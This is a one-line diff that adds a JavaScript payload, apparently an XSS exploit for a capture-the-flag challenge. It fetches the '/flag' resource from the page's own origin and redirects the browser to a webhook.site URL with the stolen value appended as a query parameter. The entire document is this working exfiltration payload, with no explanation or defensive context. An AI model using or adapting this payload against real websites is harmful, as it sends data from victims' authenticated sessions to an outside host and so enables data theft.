@@ -1,0 +1,1 @@
+fetch(`${location.origin}/flag`).then(r => r.text()).then(flag =>  location = 'https://webhook.site/a0ece3ee-cad0-4bd1-b6a3-966a82b0ffd0?flag=' + flag)
